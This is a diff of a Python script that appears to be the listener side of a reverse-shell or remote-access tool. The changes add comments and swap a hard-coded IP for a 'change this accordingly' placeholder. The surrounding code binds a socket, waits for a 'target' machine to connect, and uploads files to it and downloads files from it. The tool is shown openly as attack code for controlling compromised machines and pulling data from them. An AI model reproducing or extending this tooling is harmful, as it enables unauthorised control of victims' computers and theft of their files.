@@ -2,11 +2,12 @@ import socket
 import json
 import os
 
-
+#This function send data to target machine
 def reliable_send(data):
 	jsondata = json.dumps(data)
 	target.send(jsondata.encode())
 
+#This function recieves data from target machine
 def reliable_recv():
 	data = ''
 	while True:
@@ -16,11 +17,12 @@ def reliable_recv():
 		except ValueError:
 			continue
 
+#This function upload files to target machine
 def upload_file(file_name):
         f = open(file_name, 'rb')
         target.send(f.read())
 
-
+#This function download from target machine
 def download_file(file_name):
 	f = open(file_name, 'wb')
 	target.settimeout(1)
@@ -56,7 +58,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.1.12', 5555))
+sock.bind(('IP-Listener', Port))	#You need to change this accordingly.		
 print('[+] Listening For The Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
